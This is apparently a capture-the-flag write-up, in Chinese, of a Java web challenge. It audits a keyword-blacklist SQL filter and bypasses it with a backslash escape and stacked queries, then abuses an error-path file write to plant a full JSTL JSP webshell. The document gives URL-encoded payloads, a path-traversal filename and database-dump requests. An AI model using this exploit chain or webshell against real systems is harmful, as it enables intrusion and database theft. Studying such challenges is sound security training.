首先审计看关键代码
~~~
public String auth(@RequestParam String username, @RequestParam String password, HttpServletRequest request){
    String message="社工库未查询到泄露记录，你的账号是安全的。";

    if(SafeUtil.sql_check(username) || SafeUtil.sql_check(password)){
        message="stop sql inject!";
        return message;
    }

    try {
        String sql = "select username,password from app_user where username ='" + username + "' and password ='" + password + "' ;";
        ResultSet resultSet = DbUtil.getInstance().query(sql);
        if (null != resultSet) {
            while (resultSet.next()) {
                message = "您的QQ账号密码已经泄露，请立即修改密码";
                break;
            }
        }
    }catch (Exception e){
        e.printStackTrace();
        message="数据查询出错";
    }
    insertQueryLog(username,password);
    return message;
}
~~~
跟进看过滤
~~~
public static boolean sql_check(String sql){

    sql = sql.toLowerCase(Locale.ROOT);
    String ban[] = {"'",
            "file",
            "information",
            "mysql",
            "from",
            "update",
            "delete",
            "select",",","union","sleep","("};
    for (String s:ban) {
        if(sql.contains(s)){
            return true;
        }
    }
    return false;
}
~~~
虽然过滤的单引号，直接转义绕过，继续看配置文件config.properties
url=jdbc:mysql://127.0.0.1:3306/app?characterEncoding=utf-8&useSSL=false&&autoReconnect=true&allowMultiQueries=true&serverTimezone=UTC
db_username=root
db_password=root

明显开启了堆叠，而且没过滤分号，直接堆叠可以注入，但是其他的无法绕过
继续看代码，跟进 insertQueryLog(username,password);
~~~
private int insertQueryLog(String username,String password){
    String sql = "insert into app_query_log(username,password) values(?,?);";
    Connection connection = DbUtil.getConnection();
    PreparedStatement preparedStatement;
    int count=0;
    try {
        connection.setAutoCommit(false);
        preparedStatement=connection.prepareStatement(sql);
        preparedStatement.setQueryTimeout(3);
        preparedStatement.setString(1,username);
        preparedStatement.setString(2,password);
        count = preparedStatement.executeUpdate();
        connection.commit();
    } catch (SQLException e) {
        LogUtil.save(username,password);
        e.printStackTrace();
    }

    return count;
}
~~~
跟进LogUtil.save方法
~~~
public class LogUtil {
    public LogUtil() {
    }

    public static void save(String username, String password) {
        FileUtil.SaveFileAs(username, password);
    }
}
~~~
继续跟进FiltUtil.SaveFileAs方法
~~~
public static boolean SaveFileAs(String content, String path) {
    FileWriter fw = null;

    boolean var4;
    try {
        fw = new FileWriter(new File(path), false);
        if (content != null) {
            fw.write(content);
        }

        return true;
    } catch (IOException var14) {
        var14.printStackTrace();
        var4 = false;
    } finally {
        if (fw != null) {
            try {
                fw.flush();
                fw.close();
            } catch (IOException var13) {
                var13.printStackTrace();
            }
        }

    }

    return var4;
}
~~~
那么思路就清晰起来了，只要报异常，就能以username为内容，password为文件名来实现任意文件写
但是过滤了(就很伤，没有办法调用方法
所以到这里时，需要解决两个问题：

- 让sql报错，进入catch异常，实现任意文件写
- 不用括号，读取数据库内容

接着我们来一一解决
首先看看要让其报错的语句
String sql = "insert into app_query_log(username,password) values(?,?);";
很明显是一个插入语句，怎么才能失败呢，有几种方法

1.修改app_query_log表，让username为主键，重复插入时会报异常。
2.删除app_query_log表，找不到要插入的表，报异常
3.锁表

我们这里使用比较优雅的方式，就是锁表来实现
第一步，先锁表，禁止更新的情况下，插入会报异常。
username=a\&password=;flush tables with read lock;%23
第二步，写入jsp文件，由于过滤了括号，这时候只能使用jstl标签来执行，完美避开了括号
下面是标签执行sql语句并回显的小马
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/sql" prefix="sql"%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
<%@ page isELIgnored="false" %>
<sql:setDataSource var="test" driver="${param.driver}"
        url="${param.url}" user="root" password="root" />
   <sql:query dataSource="${test}" var="result">
        ${param.sql}
    </sql:query>

<table border="1" width="100%">
        <tr>
            <th>ctfshow</th>
        </tr>
        <c:forEach var="row" items="${result.rows}">
            <tr>
                <td><c:out value="${row.t}" /></td>
            </tr>
        </c:forEach>
    </table>
    
    被过滤的关键字，一律使用get参数注入，绕过waf，payload如下：
~~~
    username=%3C%25%40%20page%20language%3D%22java%22%20contentType%3D%22text%2Fhtml%3B%20charset%3DUTF-8%22%0A%20%20%20%20pageEncoding%3D%22UTF-8%22%25%3E%0A%3C%25%40%20taglib%20uri%3D%22http%3A%2F%2Fjava.sun.com%2Fjsp%2Fjstl%2Fsql%22%20prefix%3D%22sql%22%25%3E%0A%3C%25%40%20taglib%20uri%3D%22http%3A%2F%2Fjava.sun.com%2Fjsp%2Fjstl%2Fcore%22%20prefix%3D%22c%22%25%3E%0A%3C%25%40%20page%20isELIgnored%3D%22false%22%20%25%3E%0A%3Csql%3AsetDataSource%20var%3D%22test%22%20driver%3D%22%24%7Bparam.driver%7D%22%0A%20%20%20%20%20%20%20%20url%3D%22%24%7Bparam.url%7D%22%20user%3D%22root%22%20password%3D%22root%22%20%2F%3E%0A%20%20%20%3Csql%3Aquery%20dataSource%3D%22%24%7Btest%7D%22%20var%3D%22result%22%3E%0A%20%20%20%20%20%20%20%20%24%7Bparam.sql%7D%0A%20%20%20%20%3C%2Fsql%3Aquery%3E%0A%0A%0A%0A%3Ctable%20border%3D%221%22%20width%3D%22100%25%22%3E%0A%20%20%20%20%20%20%20%20%3Ctr%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3Et%3C%2Fth%3E%0A%20%20%20%20%20%20%20%20%3C%2Ftr%3E%0A%20%20%20%20%20%20%20%20%3Cc%3AforEach%20var%3D%22row%22%20items%3D%22%24%7Bresult.rows%7D%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E%3Cc%3Aout%20value%3D%22%24%7Brow.t%7D%22%20%2F%3E%3C%2Ftd%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Ftr%3E%0A%20%20%20%20%20%20%20%20%3C%2Fc%3AforEach%3E%0A%20%20%20%20%3C%2Ftable%3E&password=../webapps/ROOT/1.jsp
~~~    
    成功生成1.jsp作为小马
第三步，使用小马，查询数据库所有表的名字
http://xxx/1.jsp?driver=com.mysql.jdbc.Driver&url=jdbc:mysql://localhost:3306/app?characterEncoding=utf-8&useSSL=false&&autoReconnect=true&allowMultiQueries=true&serverTimezone=UTC&sql=select group_concat(table_name) as t from information_schema.tables where table_schema="app";

第四步，读取flag值
http://xxx.com/1.jsp?driver=com.mysql.jdbc.Driver&url=jdbc:mysql://localhost:3306/app?characterEncoding=utf-8&useSSL=false&&autoReconnect=true&allowMultiQueries=true&serverTimezone=UTC&sql=select f1ag as t from app_flag_xxoo_non0 union select 1;
